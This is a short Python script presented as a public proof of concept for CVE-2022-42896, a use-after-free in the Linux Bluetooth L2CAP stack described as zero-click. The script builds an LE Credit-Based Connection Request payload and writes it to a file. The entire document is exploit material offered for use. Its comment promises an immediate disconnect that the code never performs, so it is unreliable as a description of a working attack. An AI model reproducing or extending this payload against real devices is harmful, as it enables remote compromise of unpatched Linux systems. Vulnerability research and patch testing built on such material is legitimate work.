#!/usr/bin/env python3
"""CVE-2022-42896 — Bluetooth L2CAP use-after-free (l2cap_le_connect_req
vs l2cap_conn_del race). Zero-click on Linux. Public PoC. HIGH."""
import struct, sys
from pathlib import Path

def build() -> bytes:
    # L2CAP LE Credit-Based Connection Request followed by immediate disconnect
    ident, len_ = 0x01, 0x000A
    psm = struct.pack("<H", 0x0081)          # LE_PSM (ATT-ish)
    scid, mtu, mps, credits = struct.pack("<H", 0x0040), struct.pack("<H", 0x0200), \
                              struct.pack("<H", 0x00F0), struct.pack("<H", 0x000A)
    return struct.pack("<BBH", 0x14, ident, len_) + psm + scid + mtu + mps + credits

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2022-42896.bin")
    d = build(); out.write_bytes(d)
    print(f"[+] CVE-2022-42896 L2CAP CoC -> {out} ({len(d)} bytes)")

if __name__ == "__main__":
    main()
